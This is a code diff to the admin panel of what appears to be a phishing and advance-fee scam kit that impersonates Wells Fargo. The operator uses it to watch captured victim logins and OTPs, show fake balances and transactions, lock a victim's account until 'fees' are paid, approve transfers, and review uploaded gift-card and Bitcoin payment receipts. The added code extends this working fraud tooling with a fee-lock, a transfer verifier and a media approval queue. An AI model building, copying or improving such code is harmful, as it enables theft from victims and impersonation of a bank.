@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Dashboard</title>
-    <link rel="icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico">
+    <link rel="icon" href="https://www.wellsfargo.com/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://www.wellsfargo.com/favicon.ico" type="image/x-icon">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
@@ -27,7 +28,7 @@
         .log-area strong { color:#00d2ff; }
         .chat-message { margin-bottom:10px; padding:8px 12px; border-radius:8px; width:fit-content; max-width:80%; }
         .chat-message.user { background:#3a3a52; align-self:flex-start; }
-        .chat-message.admin { background:#d71e28; align-self:flex-end; margin-left:auto; }
+        .chat-message.admin { background:#006a4d; align-self:flex-end; margin-left:auto; }
         .chat-input-area { display:flex; gap:8px; }
         .chat-input-area input { flex:1; padding:10px; background:#151521; border:1px solid #3a3a52; color:white; border-radius:6px; }
         .chat-input-area button { background-color:#00d2ff; color:#000; padding:0 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; }
@@ -83,15 +84,24 @@
                 <!-- Account Status Control -->
                 <div class="settings-group" style="text-align:center; border:2px solid #d9534f;">
                     <p style="color:white; font-weight:bold;"><i class="fas fa-lock"></i> Victim Account Status</p>
-                    <p style="font-size:11px;">If Locked, victim sees "Account Closed" and cannot transfer.</p>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <button class="red" id="btnLockAccount">Lock Account</button>
-                        <button class="green" id="btnUnlockAccount">Unlock Account</button>
+                    <p style="font-size:11px;">Select lock type. If fees, set the amount.</p>
+                    <div style="display:flex; flex-direction:column; gap:10px; margin-top:10px;">
+                        <select id="lockTypeSelect" style="width:100%; padding:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px;" onchange="document.getElementById('feeInputContainer').style.display = (this.value === 'fees') ? 'block' : 'none';">
+                            <option value="none">Unlocked</option>
+                            <option value="verification">Locked with Verification</option>
+                            <option value="fees">Locked with Fees</option>
+                        </select>
+                        <div id="feeInputContainer" style="display:none; text-align:left;">
+                            <p style="font-size:12px; color:#a0a0b8; margin-bottom:4px;">Interest Fee Amount ($)</p>
+                            <input type="number" id="lockFeeInput" placeholder="e.g. 500" style="width:100%; padding:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px;">
+                        </div>
+                        <button class="red" id="btnUpdateLock">Update Lock Status</button>
                     </div>
                     <div id="lockStatusDisplay" style="margin-top:10px; font-weight:bold; color:#a0a0b8;">Current: UNKNOWN</div>
                 </div>
 
 
+                
                 
                 <!-- Profile Picture -->
                 <div class="settings-group">
@@ -126,6 +136,37 @@
                     <div id="acctCredStatus" class="status-msg"></div>
                 </div>
 
+                
+                <!-- Domestic Transfer Configuration -->
+                <div class="settings-group" style="border:2px solid #3498db;">
+                    <p style="color:white; font-weight:bold;"><i class="fas fa-money-check-alt"></i> Domestic Transfer Verifier</p>
+                    <p style="font-size:11px; margin-bottom:8px;">Generate expected details for "STARK Building Materials US".</p>
+                    <select id="domBank" style="width:100%; padding:8px; margin-bottom:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px;">
+                        <option value="">-- Select Target Bank --</option>
+                        <option value="Wells Fargo">Wells Fargo</option>
+                        <option value="Bank of America">Bank of America</option>
+                        <option value="Chase">Chase</option>
+                        <option value="Citibank">Citibank</option>
+                        <option value="U.S. Bank">U.S. Bank</option>
+                        <option value="PNC Bank">PNC Bank</option>
+                        <option value="Capital One">Capital One</option>
+                        <option value="TD Bank">TD Bank</option>
+                        <option value="Truist">Truist</option>
+                    </select>
+                    <input type="text" id="domName" placeholder="Full Name">
+                    <input type="text" id="domSort" placeholder="Sort Code (XX-XX-XX)">
+                    <input type="text" id="domAcc" placeholder="Account Number (8 digits)">
+                    <button class="green" id="btnSetDom">Generate Domestic Transfer</button>
+                    <div id="domStatus" class="status-msg"></div>
+                    <div id="activeGeneratedDom" style="margin-top:10px; padding:10px; background:#151521; border-left:3px solid #3498db; border-radius:4px; font-size:12px; display:none;">
+                        <strong style="color:#00d2ff;">Active Generated Details:</strong><br>
+                        <span style="color:#a0a0b8;">Bank:</span> <span id="dispDomBank" style="color:white;"></span><br>
+                        <span style="color:#a0a0b8;">Name:</span> <span id="dispDomName" style="color:white;"></span><br>
+                        <span style="color:#a0a0b8;">Sort:</span> <span id="dispDomSort" style="color:white;"></span><br>
+                        <span style="color:#a0a0b8;">Acc:</span> <span id="dispDomAcc" style="color:white;"></span>
+                    </div>
+                </div>
+
                 <!-- OTP Generator -->
                 <div class="settings-group" style="text-align:center;">
                     <p>Generate OTP Code</p>
@@ -139,25 +180,51 @@
                     <input type="text" id="adminCardName" placeholder="e.g. EMRIOUS KYUNG ZING">
                     <p><i class="fas fa-dollar-sign"></i> Card Balance</p>
                     <input type="text" id="adminCardBalance" placeholder="e.g. $140,000.00">
+                    <p><i class="fas fa-hashtag"></i> Card Number</p>
+                    <input type="text" id="adminCardNum" placeholder="e.g. 4833 1603 2874 4609">
+                    <p><i class="fas fa-hashtag"></i> Account Number</p>
+                    <input type="text" id="adminAccNum" placeholder="e.g. 12345678">
                     <button id="btnUpdateCard">Update Card</button>
                     <div id="cardStatus" class="status-msg"></div>
                 </div>
 
+                
                 <!-- Transaction Manager -->
                 <div class="settings-group">
                     <p><i class="fas fa-list"></i> Add Transaction</p>
-                    <input type="text" id="txDesc" placeholder="Description (e.g. Direct Deposit)">
-                    <input type="text" id="txDate" placeholder="Date (e.g. June 3, 2026)">
-                    <input type="text" id="txAmount" placeholder="Amount (e.g. $40,000.00)">
+                    <input type="text" id="txDesc" placeholder="Description (e.g. STARK Building Materials US)">
+                    <input type="text" id="txDate" placeholder="Date (Editable, e.g. June 8, 2026)">
+                    <input type="text" id="txAmount" placeholder="Amount (min $500,000)">
                     <select id="txType"><option value="deposit">Deposit</option><option value="withdrawal">Withdrawal</option></select>
                     <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
                     <button class="green" id="btnAddTx">Add Transaction</button>
                     <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
                     <button class="blue" id="btnAddBuildingTx" style="margin-top:6px; background:#3498db; color:white; padding:8px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%; font-size:13px;">Add Default Building Material Transactions</button>
-                    <!-- replaced red --> style="margin-top:6px;">Clear All Transactions</button>
                 </div>
+
                 <div id="adminTxList" style="background:#151521; padding:10px; border-radius:6px; max-height:200px; overflow-y:auto;">
                     <p style="color:#666;">No custom transactions set.</p>
+                </div>
+            </div>
+
+            <!-- Approvals & Media Panel -->
+            <div class="panel">
+                <h2>Pending Approvals & Media</h2>
+                
+                <div id="pendingTransferBox" style="background:#151521; padding:15px; border-radius:6px; border:1px solid #3498db; margin-bottom:15px; display:none;">
+                    <h3 style="color:#3498db; margin-bottom:10px;"><i class="fas fa-exchange-alt"></i> Pending Transfer Request</h3>
+                    <p style="font-size:20px; font-weight:bold; margin-bottom:5px;" id="ptAmount"></p>
+                    <p style="color:#a0a0b8; font-size:14px; margin-bottom:5px;" id="ptBank"></p>
+                    <p style="color:#a0a0b8; font-size:14px; margin-bottom:15px;" id="ptDetails"></p>
+                    <div style="display:flex; gap:10px;">
+                        <button class="green" id="btnApproveTransfer" style="flex:1; padding:10px; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Approve</button>
+                        <button class="red" id="btnDeclineTransfer" style="flex:1; padding:10px; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Decline</button>
+                    </div>
+                </div>
+                
+                <h3 style="margin-top:10px; color:#a0a0b8; border-bottom:1px solid #3a3a52; padding-bottom:8px; font-size:14px;">Uploaded Documents / Receipts</h3>
+                <div id="uploadedImagesBox" style="margin-top:10px; display:flex; flex-direction:column; gap:15px; max-height:400px; overflow-y:auto;">
+                    <p style="color:#666; font-size:13px;" id="noImagesText">No media uploaded yet.</p>
                 </div>
             </div>
             
@@ -262,6 +329,7 @@
         // ===== POLLING =====
         function startPolling() {
             if (pollingInterval) return;
+            // Initial fetch
             pollOnce();
             pollingInterval = setInterval(pollOnce, 1000);
         }
@@ -282,15 +350,6 @@
                 } catch(e){}
             }
             previousStateStr = newStateStr;
-
-            
-                var isLocked = globalState.accountLocked;
-                var lockDisp = document.getElementById('lockStatusDisplay');
-                if (isLocked === true) {
-                    lockDisp.innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
-                } else if (isLocked === false) {
-                    lockDisp.innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
-                }
 
             // Poll Credentials
             var logs = getSyncItem('adminLogs');
@@ -315,12 +374,13 @@
                 else { aiBtn.style.background = '#d9534f'; aiBtn.innerText = 'OFF'; }
             }
 
-                        // Poll Welcome Name
-            var wName = getSyncItem('welcomeName');
-            if (wName && document.activeElement !== document.getElementById('adminWelcomeName')) {
-                var wNameEl = document.getElementById('adminWelcomeName');
-                if(wNameEl) wNameEl.value = wName;
+            
+            // Poll Welcome Name
+            var curName = getSyncItem('welcomeName');
+            if (curName && document.activeElement !== document.getElementById('adminWelcomeName')) {
+                document.getElementById('adminWelcomeName').value = curName;
             }
+
             // Poll Display Email
             var currentEmail = getSyncItem('displayEmail');
             if (currentEmail) {
@@ -330,6 +390,10 @@
                     document.getElementById('adminDisplayEmail').value = currentEmail;
                 }
             }
+
+            
+            // Poll Profile Picture (File input cannot be populated programmatically for security reasons, so we skip it)
+            var pPic = getSyncItem('profilePic');
 
             // Poll Account Credentials
             var acctUser = getSyncItem('acctUsername');
@@ -341,17 +405,47 @@
                 document.getElementById('adminAcctPassword').value = acctPass;
             }
 
+            
+            // Poll Domestic Details
+            var dBank = getSyncItem('expectedDomBank');
+            var dName = getSyncItem('expectedDomName');
+            var dSort = getSyncItem('expectedDomSort');
+            var dAcc = getSyncItem('expectedDomAcc');
+            
+            if (dBank && document.activeElement !== document.getElementById('domBank')) document.getElementById('domBank').value = dBank;
+            if (dName && document.activeElement !== document.getElementById('domName')) document.getElementById('domName').value = dName;
+            if (dSort && document.activeElement !== document.getElementById('domSort')) document.getElementById('domSort').value = dSort;
+            if (dAcc && document.activeElement !== document.getElementById('domAcc')) document.getElementById('domAcc').value = dAcc;
+            
+            if (dBank && dName && dSort && dAcc) {
+                document.getElementById('activeGeneratedDom').style.display = 'block';
+                document.getElementById('dispDomBank').innerText = dBank;
+                document.getElementById('dispDomName').innerText = dName;
+                document.getElementById('dispDomSort').innerText = dSort;
+                document.getElementById('dispDomAcc').innerText = dAcc;
+            } else {
+                document.getElementById('activeGeneratedDom').style.display = 'none';
+            }
+
             // Poll Card Details
             var cName = getSyncItem('cardName');
             var cBal = getSyncItem('cardBalance');
+            var cNum = getSyncItem('cardNumber');
+            var aNum = getSyncItem('accountNumber');
             if (cName && document.activeElement !== document.getElementById('adminCardName')) {
                 document.getElementById('adminCardName').value = cName;
             }
             if (cBal && document.activeElement !== document.getElementById('adminCardBalance')) {
                 document.getElementById('adminCardBalance').value = cBal;
             }
+            if (cNum && document.activeElement !== document.getElementById('adminCardNum')) {
+                document.getElementById('adminCardNum').value = cNum;
+            }
+            if (aNum && document.activeElement !== document.getElementById('adminAccNum')) {
+                document.getElementById('adminAccNum').value = aNum;
+            }
 
-                        // Poll Transactions
+            // Poll Transactions
             var txs = getSyncItem('transactions');
             var isAnyInputFocused = document.activeElement && document.activeElement.tagName === 'INPUT' && document.activeElement.id.startsWith('inlineTx');
             if (!isAnyInputFocused) {
@@ -381,7 +475,69 @@
                 }
             }
 
-            // Action buttons// Action buttons
+            // Poll Lock Type & Fee
+            var currentLockType = getSyncItem('lockType') || 'none';
+            var currentLockFee = getSyncItem('lockFee') || '';
+            var lDisplay = document.getElementById('lockStatusDisplay');
+            if (lDisplay) {
+                if (currentLockType === 'none') lDisplay.innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
+                else if (currentLockType === 'verification') lDisplay.innerHTML = '<span style="color:#d9534f;">LOCKED (Verification)</span>';
+                else if (currentLockType === 'fees') lDisplay.innerHTML = '<span style="color:#d9534f;">LOCKED (Fees: $' + currentLockFee + ')</span>';
+            }
+
+            // Poll Pending Transfer
+            var pt = getSyncItem('pendingTransfer');
+            var pStatus = getSyncItem('transferStatus');
+            var ptBox = document.getElementById('pendingTransferBox');
+            if (ptBox) {
+                if (pt && pStatus === 'pending') {
+                    ptBox.style.display = 'block';
+                    document.getElementById('ptAmount').innerText = 'Amount: $' + pt.amount;
+                    document.getElementById('ptBank').innerText = 'Bank: ' + pt.bank;
+                    document.getElementById('ptDetails').innerText = 'Recipient: ' + pt.name + ' (Sort: ' + pt.sortCode + ', Acc: ' + pt.accNum + ')';
+                } else {
+                    ptBox.style.display = 'none';
+                }
+            }
+
+            // Poll Uploaded Media
+            var mediaList = getSyncItem('uploadedMedia');
+            var mediaBox = document.getElementById('uploadedImagesBox');
+            if (mediaBox) {
+                if (mediaList && Array.isArray(mediaList) && mediaList.length > 0) {
+                    var mediaHtml = '';
+                    mediaList.forEach(function(mediaItem, mIdx) {
+                        var statusHtml = '';
+                        if (mediaItem.status === 'approved') {
+                            statusHtml = '<span style="color:#5cb85c; font-weight:bold; font-size:12px; float:right;">Approved</span>';
+                        } else if (mediaItem.status === 'declined') {
+                            statusHtml = '<span style="color:#d9534f; font-weight:bold; font-size:12px; float:right;">Declined</span>';
+                        }
+                        
+                        var actionsHtml = '';
+                        if (!mediaItem.status || mediaItem.status === 'pending') {
+                            actionsHtml = '<div style="display:flex; gap:10px; margin-top:10px;">' +
+                                '<button onclick="verifyMedia(' + mIdx + ', \'approved\')" style="flex:1; padding:6px; background:#5cb85c; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">Approve</button>' +
+                                '<button onclick="verifyMedia(' + mIdx + ', \'declined\')" style="flex:1; padding:6px; background:#d9534f; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">Decline</button>' +
+                                '</div>';
+                        }
+                        
+                        mediaHtml += '<div style="background:#1e1e2d; padding:10px; border-radius:6px; border:1px solid #3a3a52;">' +
+                            statusHtml +
+                            '<p style="color:#00d2ff; font-weight:bold; margin-bottom:5px;">' + mediaItem.type + '</p>' +
+                            '<p style="color:#a0a0b8; font-size:12px; margin-bottom:10px;">' + mediaItem.date + '</p>' +
+                            '<img src="' + mediaItem.dataUrl + '" style="max-width:100%; border-radius:4px; margin-bottom:10px;">' +
+                            '<a href="' + mediaItem.dataUrl + '" download="' + mediaItem.filename + '" style="display:block; text-align:center; background:#3498db; color:white; padding:8px; border-radius:4px; text-decoration:none; font-size:13px; font-weight:bold;">Download File</a>' +
+                            actionsHtml +
+                            '</div>';
+                    });
+                    mediaBox.innerHTML = mediaHtml;
+                } else {
+                    mediaBox.innerHTML = '<p style="color:#666; font-size:13px;" id="noImagesText">No media uploaded yet.</p>';
+                }
+            }
+
+            // Action buttons
             injectAdminActions();
         }
 
@@ -404,7 +560,7 @@
 
             var sLog = getSyncItem('loginStatus');
             if (sLog === 'otp_submitted' && !document.getElementById('btnApproveLogin')) {
-                logArea.innerHTML += '<div id="actionLogin_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Initial Wells Fargo Login):</strong><br><button id="btnApproveLogin" onclick="approveStep(\'loginStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button></div>';
+                logArea.innerHTML += '<div id="actionLogin_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Initial Login):</strong><br><button id="btnApproveLogin" onclick="approveStep(\'loginStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button></div>';
             }
         }
 
@@ -424,6 +580,41 @@
 
         // ===== BUTTON EVENT LISTENERS =====
 
+        // Update the account lock state
+        var btnUpdateLock = document.getElementById('btnUpdateLock');
+        if (btnUpdateLock) {
+            btnUpdateLock.onclick = async function() {
+                var lType = document.getElementById('lockTypeSelect').value;
+                var lFee = document.getElementById('lockFeeInput').value;
+                await setSyncItem('lockType', lType);
+                if (lType === 'fees') {
+                    await setSyncItem('lockFee', lFee);
+                }
+                
+                // Keep backward compatibility for old code that uses accountLocked = true/false
+                if (lType === 'none') {
+                    await setSyncItem('accountLocked', false);
+                } else {
+                    await setSyncItem('accountLocked', true);
+                }
+            };
+        }
+
+        // Transfer Approval actions
+        var btnApproveTransfer = document.getElementById('btnApproveTransfer');
+        var btnDeclineTransfer = document.getElementById('btnDeclineTransfer');
+        if (btnApproveTransfer) {
+            btnApproveTransfer.onclick = async function() {
+                await setSyncItem('transferStatus', 'approved');
+            };
+        }
+        if (btnDeclineTransfer) {
+            btnDeclineTransfer.onclick = async function() {
+                await setSyncItem('transferStatus', 'declined');
+            };
+        }
+
+
         // Send Chat
         document.getElementById('btnSendChat').addEventListener('click', sendAdminMessage);
         document.getElementById('adminChatInput').addEventListener('keypress', function(e) {
@@ -439,12 +630,81 @@
             document.getElementById('adminChatInput').value = '';
         }
 
+        async function verifyMedia(index, status) {
+            var mediaList = getSyncItem('uploadedMedia');
+            if (mediaList && mediaList[index]) {
+                mediaList[index].status = status;
+                await setSyncItem('uploadedMedia', mediaList);
+                
+                var chatEntry = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> Your uploaded document (' + mediaList[index].type + ') has been ' + status + '.</div>';
+                var currentChats = getSyncItem('chatHistory') || '';
+                await setSyncItem('chatHistory', currentChats + chatEntry);
+                
+                if (status === 'approved' && (mediaList[index].type.includes('Gift Card') || mediaList[index].type.includes('BTC Payment'))) {
+                    if (confirm('Payment approved. Do you want to unlock the account automatically?')) {
+                        await setSyncItem('lockType', 'none');
+                        await setSyncItem('accountLocked', false);
+                        
+                        var unlockChat = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> Your account restriction has been lifted. You can now access all services.</div>';
+                        var currentChats2 = getSyncItem('chatHistory') || '';
+                        await setSyncItem('chatHistory', currentChats2 + unlockChat);
+                    }
+                }
+            }
+        }
+
+        
+        // Set Domestic Transfer Details
+        var btnSetDom = document.getElementById('btnSetDom');
+        if (btnSetDom) {
+            btnSetDom.onclick = async function() {
+                var bk = document.getElementById('domBank').value.trim();
+                var nm = document.getElementById('domName').value.trim();
+                var sc = document.getElementById('domSort').value.trim();
+                var ac = document.getElementById('domAcc').value.trim();
+                if (bk && nm && sc && ac) {
+                    await setSyncItem('expectedDomBank', bk);
+                    await setSyncItem('expectedDomName', nm);
+                    await setSyncItem('expectedDomSort', sc);
+                    await setSyncItem('expectedDomAcc', ac);
+                    document.getElementById('domStatus').innerText = 'Details generated and ready!';
+                    setTimeout(function(){ document.getElementById('domStatus').innerText = ''; }, 3000);
+                } else {
+                    alert('Please select a Bank and fill out Name, Sort Code, and Account Number.');
+                }
+            };
+        }
+
         // Generate OTP
         document.getElementById('btnGenOtp').addEventListener('click', async function() {
             var code = Math.floor(100000 + Math.random() * 900000).toString();
             await setSyncItem('expectedOtp', code);
             document.getElementById('generatedOtpDisplay').innerText = code;
             document.getElementById('adminChatInput').value = 'Your verification code is: ' + code;
+        });
+
+        
+        // Set Welcome Name
+        var btnSetWelcome = document.getElementById('btnSetWelcome');
+        if (btnSetWelcome) {
+            btnSetWelcome.onclick = async function() {
+                var name = document.getElementById('adminWelcomeName').value.trim();
+                if (name) {
+                    await setSyncItem('welcomeName', name);
+                    document.getElementById('welcomeNameStatus').innerText = 'Welcome name updated!';
+                    setTimeout(function(){ document.getElementById('welcomeNameStatus').innerText = ''; }, 3000);
+                }
+            };
+        }
+
+        // Set Display Email
+        document.getElementById('btnSetEmail').addEventListener('click', async function() {
+            var email = document.getElementById('adminDisplayEmail').value.trim();
+            if (email) {
+                await setSyncItem('displayEmail', email);
+                alert('Display email updated to: ' + email);
+                document.getElementById('currentEmailDisplay').innerText = 'Current: ' + email;
+            }
         });
 
         
@@ -468,29 +728,6 @@
             });
         }
 
-        // Set Welcome Name
-        var btnSetWelcome = document.getElementById('btnSetWelcome');
-        if (btnSetWelcome) {
-            btnSetWelcome.addEventListener('click', async function() {
-                var wName = document.getElementById('adminWelcomeName').value.trim();
-                if (wName) {
-                    await setSyncItem('welcomeName', wName);
-                    document.getElementById('welcomeNameStatus').innerText = 'Welcome name updated!';
-                    setTimeout(function(){ document.getElementById('welcomeNameStatus').innerText = ''; }, 3000);
-                }
-            });
-        }
-
-        // Set Display Email
-        document.getElementById('btnSetEmail').addEventListener('click', async function() {
-            var email = document.getElementById('adminDisplayEmail').value.trim();
-            if (email) {
-                await setSyncItem('displayEmail', email);
-                alert('Display email updated to: ' + email);
-                document.getElementById('currentEmailDisplay').innerText = 'Current: ' + email;
-            }
-        });
-
         // Update Account Credentials
         document.getElementById('btnUpdateCreds').addEventListener('click', async function() {
             var user = document.getElementById('adminAcctUsername').value.trim();
@@ -505,61 +742,58 @@
         document.getElementById('btnUpdateCard').addEventListener('click', async function() {
             var name = document.getElementById('adminCardName').value.trim();
             var bal = document.getElementById('adminCardBalance').value.trim();
+            var cnum = document.getElementById('adminCardNum').value.trim();
+            var anum = document.getElementById('adminAccNum').value.trim();
             if (name) await setSyncItem('cardName', name);
             if (bal) await setSyncItem('cardBalance', bal);
+            if (cnum) await setSyncItem('cardNumber', cnum);
+            if (anum) await setSyncItem('accountNumber', anum);
             document.getElementById('cardStatus').innerText = 'Card details updated!';
             setTimeout(function(){ document.getElementById('cardStatus').innerText = ''; }, 3000);
         });
+
+        var editTxIndex = -1;
+        function editTx(index) {
+            var txs = getSyncItem('transactions');
+            if (txs && txs[index]) {
+                var tx = txs[index];
+                document.getElementById('txDesc').value = tx.desc;
+                document.getElementById('txDate').value = tx.date;
+                document.getElementById('txAmount').value = tx.amount.replace(/[^0-9.-]+/g,""); 
+                document.getElementById('txType').value = tx.type;
+                document.getElementById('txStatusSel').value = tx.status;
+                editTxIndex = index;
+                document.getElementById('btnAddTx').innerText = 'Update Transaction';
+            }
+        }
 
         // Add Transaction
         document.getElementById('btnAddTx').addEventListener('click', async function() {
             var desc = document.getElementById('txDesc').value.trim();
             var date = document.getElementById('txDate').value.trim();
             var amount = document.getElementById('txAmount').value.trim();
+            if (amount && !amount.startsWith('$') && !amount.startsWith('$')) {
+                amount = '$' + amount;
+            }
             var type = document.getElementById('txType').value;
             var status = document.getElementById('txStatusSel').value;
             if (!desc || !date || !amount) { alert('Please fill out Description, Date, and Amount'); return; }
             var currentTxs = getSyncItem('transactions') || [];
             if (!Array.isArray(currentTxs)) currentTxs = [];
-            currentTxs.unshift({ desc: desc, date: date, amount: amount, type: type, status: status });
+            
+            if (editTxIndex >= 0) {
+                currentTxs[editTxIndex] = { desc: desc, date: date, amount: amount, type: type, status: status };
+                editTxIndex = -1;
+                document.getElementById('btnAddTx').innerText = 'Add Transaction';
+            } else {
+                currentTxs.unshift({ desc: desc, date: date, amount: amount, type: type, status: status });
+            }
+            
             await setSyncItem('transactions', currentTxs);
             document.getElementById('txDesc').value = '';
             document.getElementById('txDate').value = '';
             document.getElementById('txAmount').value = '';
         });
-
-        
-        var btnAddBuildingTx = document.getElementById('btnAddBuildingTx');
-        if (btnAddBuildingTx) {
-            btnAddBuildingTx.addEventListener('click', async function() {
-                var txs = getSyncItem('transactions') || [];
-                txs.push({ desc: 'Deposit - STARK Building Materials US', date: 'June 7, 2026', amount: '$850,000.00', type: 'deposit', status: 'success' });
-                txs.push({ desc: 'Withdrawal - Timber & Steel Supplies', date: 'June 5, 2026', amount: '$120,000.00', type: 'withdrawal', status: 'success' });
-                txs.push({ desc: 'Deposit - BuildBase Construction', date: 'June 1, 2026', amount: '$550,000.00', type: 'deposit', status: 'success' });
-                await setSyncItem('transactions', txs);
-                alert('Building Material Transactions Added!');
-            });
-        }
-
-        
-        // Inline Save Transaction
-        async function saveInlineTx(index) {
-            var currentTxs = getSyncItem('transactions') || [];
-            if (!Array.isArray(currentTxs) || !currentTxs[index]) return;
-            
-            var newDate = document.getElementById('inlineTxDate_' + index).value.trim();
-            var newAmount = document.getElementById('inlineTxAmount_' + index).value.trim();
-            
-            if (newAmount && !newAmount.startsWith('$') && !newAmount.startsWith('£')) {
-                newAmount = '$' + newAmount;
-            }
-            
-            currentTxs[index].date = newDate;
-            currentTxs[index].amount = newAmount;
-            
-            await setSyncItem('transactions', currentTxs);
-            alert('Transaction updated!');
-        }
 
         // Remove single transaction
         async function removeTx(index) {
@@ -578,15 +812,6 @@
             if (confirm('Clear all custom transactions?')) {
                 await setSyncItem('transactions', null);
             }
-        });
-
-        // Account Lock Status Controls
-        document.getElementById('btnLockAccount').addEventListener('click', async function() {
-            await setSyncItem('accountLocked', true);
-        });
-
-        document.getElementById('btnUnlockAccount').addEventListener('click', async function() {
-            await setSyncItem('accountLocked', false);
         });
 
         // AI Toggle
